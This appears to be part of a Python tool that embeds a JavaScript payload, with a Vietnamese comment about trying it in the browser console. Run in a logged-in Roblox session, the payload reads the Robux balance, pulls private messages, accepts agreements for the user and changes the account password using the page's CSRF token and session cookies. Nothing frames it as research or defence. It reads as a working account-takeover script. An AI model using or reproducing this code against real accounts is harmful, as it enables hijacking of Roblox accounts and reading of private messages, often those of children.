
SCRIPT = """
class RobloxInfo {
    async getRobux() {
        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {method: 'GET'})
        const data = await response.json()
        return data['RobuxBalance']

    }

    async getMessages() {
        const response = await fetch(
            'https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20',
            {
                method: 'GET',
                credentials: 'include'
            }
        )

        return await response.text()
    }

    async agreeRoblox() {
        const url = 'https://apis.roblox.com/user-agreements/v1/acceptances'
        fetch(url, {
            method: 'OPTIONS',
            credentials: 'include'
        })
        
        var datapost = {"acceptances":[{"agreementId":"acf1f8dc-6fc5-4604-8fca-81387b7080b2"}]}
        const token = document.querySelector('meta[name="csrf-token"]').getAttribute('data-token')
        const respAgree = await fetch(url,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json;charset=UTF-8',
                    'X-Csrf-Token': token
                },
                body: JSON.stringify(datapost),
                credentials: 'include'
            }
        )
        return await respAgree.text()
    }

    async changePassword(oldPassword, newPassword) {
        const url = 'https://auth.roblox.com/v2/user/passwords/change'
        fetch(url, {
            method: 'OPTIONS',
            credentials: 'include'
        })

        var datapost = 'currentPassword='+ oldPassword +'&newPassword=' + newPassword
        const token = document.querySelector('meta[name="csrf-token"]').getAttribute('data-token')
        const respChange = await fetch(url,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Csrf-Token': token
                },
                body: datapost,
                credentials: 'include'
            }
        )
        return await respChange.text()
    }
}
const info = new RobloxInfo()
"""

# chay tren console thu